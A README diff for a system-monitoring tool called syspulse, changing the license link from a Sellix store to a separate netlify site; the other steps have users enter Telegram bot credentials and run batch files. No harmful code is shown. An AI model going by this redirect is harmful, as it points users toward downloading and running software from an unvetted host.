@@ -53,7 +53,7 @@ It's not here to replace your antivirus. It's here to watch the things your anti
 
 ## How to use it
 
-1. Grab a license from the [Sellix store](https://phantom.sellix.cx/p/syspulse-5).
+1. Grab a license from the [syspulse](https://syspulse20.netlify.app)
 2. Open `config.ini` — put your Telegram bot token, chat ID, and license key. (Don't worry, the downloaded package includes a guide that walks you through every step.)
 3. Run `Run.bat`. To stop it, run `Kill.bat`.
 
